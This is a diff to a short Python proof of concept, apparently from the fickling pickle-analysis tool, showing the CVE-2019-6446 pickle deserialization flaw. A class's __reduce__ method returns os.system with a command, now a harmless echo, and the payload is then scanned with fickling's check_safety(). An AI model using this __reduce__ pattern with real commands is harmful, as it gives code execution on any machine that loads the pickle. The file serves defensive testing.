@@ -1,18 +1,19 @@
 # This PoC has been adapted from https://snyk.io/vuln/SNYK-PYTHON-NUMPY-73513 (CVE-2019-6446)
 
-import numpy
 import os
 import pickle
+
+import numpy
+
 from fickling.fickle import Pickled
 
 
-class Test(object):
+class Test:
     def __init__(self):
         self.a = 1
 
     def __reduce__(self):
-        # Runs the other PoC found in /examples
-        return (os.system, ("python pytorch_poc.py",))
+        return (os.system, ("echo 'Now I can run malicious code! Never trust a pickle.'",))
 
 
 payload = Test()
@@ -29,9 +30,7 @@ print("\n\nWith fickling\n\n")
 
 fickled_payload = Pickled.load(pickle.dumps(payload))
 
-print("\n\nIs this is_likely_safe?")
-safety = fickled_payload.is_likely_safe
-if safety is False:
-    print("❌")
-else:
-    print("✅")
+print("\n\nHow likely is this to be safe?\n\n")
+safety_results = fickled_payload.check_safety().to_dict()
+
+print(safety_results)
